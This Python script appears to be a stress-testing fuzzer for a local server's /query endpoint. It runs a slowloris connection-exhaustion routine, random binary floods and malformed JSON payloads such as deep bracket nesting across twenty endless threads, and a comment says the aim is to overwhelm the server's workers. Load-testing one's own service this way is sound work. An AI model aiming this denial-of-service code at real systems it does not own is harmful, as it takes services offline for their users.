import socket
import threading
import time
import random
import json
import string

TARGET_HOST = "127.0.0.1"
TARGET_PORT = 8080

def slowloris_attack():
    """Opens a connection, sends incomplete headers, and keeps it alive slowly."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.send(b"POST /query HTTP/1.1\r\n")
        s.send(b"Host: localhost\r\n")
        # Do NOT send the final \r\n\r\n
        
        # Keep sending headers very slowly
        for i in range(100):
            time.sleep(1)
            s.send(f"X-Random-Header-{i}: {random.randint(1, 1000)}\r\n".encode())
    except Exception:
        pass

def garbage_injection():
    """Connects and blasts random binary garbage until dropped."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_HOST, TARGET_PORT))
        garbage = bytes(random.choices(range(256), k=4096))
        s.send(garbage)
        time.sleep(2)
        s.close()
    except Exception:
        pass

def malformed_query():
    """Sends a complete HTTP POST request but with malformed/pathological JSON AST."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((TARGET_HOST, TARGET_PORT))
        
        choice = random.randint(0, 3)
        if choice == 0:
            payload = '{"$and": [{"broken": ]}'
        elif choice == 1:
            payload = "[" * 500 + "]" * 500
        elif choice == 2:
            payload = '{"test": "\xff\xfe"}'
        else:
            payload = ''.join(random.choices(string.printable, k=1024))
            
        req = f"POST /query HTTP/1.1\r\nHost: localhost\r\nContent-Length: {len(payload)}\r\n\r\n{payload}"
        s.send(req.encode('utf-8', 'ignore'))
        
        # Read response to see if it gracefully rejects
        s.recv(4096)
        s.close()
    except Exception:
        pass

def attack_worker(worker_id):
    attacks = [slowloris_attack, garbage_injection, malformed_query]
    while True:
        attack = random.choice(attacks)
        attack()

if __name__ == "__main__":
    print(f"Starting Fuzzer targeting {TARGET_HOST}:{TARGET_PORT}...")
    threads = []
    # Spawn 20 threads to overwhelm the server (which likely has < 8 workers)
    for i in range(20):
        t = threading.Thread(target=attack_worker, args=(i,), daemon=True)
        t.start()
        threads.append(t)
        
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Fuzzer stopped.")
